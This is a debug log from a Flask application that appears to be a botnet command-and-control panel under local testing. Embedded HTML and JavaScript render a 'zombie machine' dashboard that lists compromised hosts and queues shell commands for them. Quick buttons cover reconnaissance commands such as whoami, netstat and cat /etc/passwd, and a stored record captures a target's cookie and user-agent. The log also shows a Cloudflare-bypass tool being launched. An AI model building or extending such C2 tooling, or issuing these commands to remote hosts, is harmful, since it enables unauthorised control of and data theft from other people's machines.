document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 21:21:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:21:01] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 21:21:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:21:01] "GET /static/css/control_message.css HTTP/1.1" 200 -
2025-06-25 21:21:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:21:01] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 21:21:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-25 21:21:04 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-25 21:21:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-25 21:21:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:21:04] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-25 21:23:41 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 21:23:41 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 21:23:41 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 21:23:41 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 21:23:41 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 21:23:41 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 21:23:41 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 21:23:41 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 21:23:41 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-25 21:24:11 | ERROR    | start_flaresolverr.py:122 | start_flaresolverr() | FlareSolverr 啟動超時
2025-06-25 21:24:11 | INFO     | start_flaresolverr.py:249 | stop_monitoring() | FlareSolverr 監控已停止
2025-06-25 21:24:11 | INFO     | start_flaresolverr.py:148 | stop_flaresolverr() | 正在停止 FlareSolverr 進程 (PID: 17584)
2025-06-25 21:24:11 | INFO     | start_flaresolverr.py:158 | stop_flaresolverr() | FlareSolverr 已停止
2025-06-25 21:24:11 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-25 21:24:11 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-25 21:24:11 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-25 21:24:11 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-25 21:27:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:27:56] "[33mGET /api/control/add_command_to_do HTTP/1.1[0m" 404 -
2025-06-25 21:27:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:27:56] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 21:28:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:28:23] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 21:28:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:28:23] "[33mGET /api/control/add_command_to_do HTTP/1.1[0m" 404 -
2025-06-25 21:28:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:28:23] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 21:28:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 21:28:25 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 21:28:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0288s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-25T03:25:06.035Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 11:25:06.039456</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 21:28:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:28:25] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 21:28:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:28:25] "GET /static/css/control_message.css HTTP/1.1" 200 -
2025-06-25 21:28:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:28:25] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 21:28:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-25 21:28:28 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-25 21:28:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-25 21:28:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:28:28] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-25 21:31:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_command_to_do(zombie_ip='<zombie=1>')
2025-06-25 21:31:23 | INFO     | control_route.py:197 | add_command_to_do() | 用戶請求為殭屍機器 <zombie=1> 添加命令
2025-06-25 21:31:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_command_to_do 執行完畢 (耗時: 0.0022s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>為殭屍機器添加命令</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <h2>💀 為殭屍機器添加命令</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">\n        目標殭屍機器: <strong style="color: #667eea;">&lt;zombie=1&gt;</strong>\n    </p>\n\n    <form method="post" action="/api/control/add_command_to_do/%3Czombie=1%3E">\n        <div class="form-group">\n            <label class="form-label" for="command">執行命令</label>\n            <input type="text" id="command" name="command" placeholder="輸入要執行的命令 (例如: whoami, ls -la, ps aux)" required>\n        </div>\n\n        <div class="form-group">\n            <label class="form-label">常用命令 (點擊快速填入)</label>\n            <div class="quick-commands">\n                <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                <button type="button" class="quick-cmd-btn" onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">系統資訊</button>\n                <button type="button" class="quick-cmd-btn" onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">磁碟空間</button>\n            </div>\n        </div>\n\n        <div style="display: flex; gap: 15px; justify-content: center; margin-top: 30px;">\n            <button type="submit">💀 發送命令</button>\n            <a href="/api/control/get_messages?tab=zombies" style="padding: 18px 30px; background: #6c757d; color: white; text-decoration: none; \n                      border-radius: 12px; font-weight: bold;">\n                ← 返回殭屍管理\n            </a>\n        </div>\n    </form>\n</div>\n\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n        document.getElementById(\'command\').focus();\n    }\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 21:31:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:31:23] "GET /api/control/add_command_to_do/<zombie=1> HTTP/1.1" 200 -
2025-06-25 21:31:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:31:23] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-25 21:31:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:31:23] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 21:31:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 21:31:29 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 21:31:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0010s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-25T03:25:06.035Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 11:25:06.039456</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            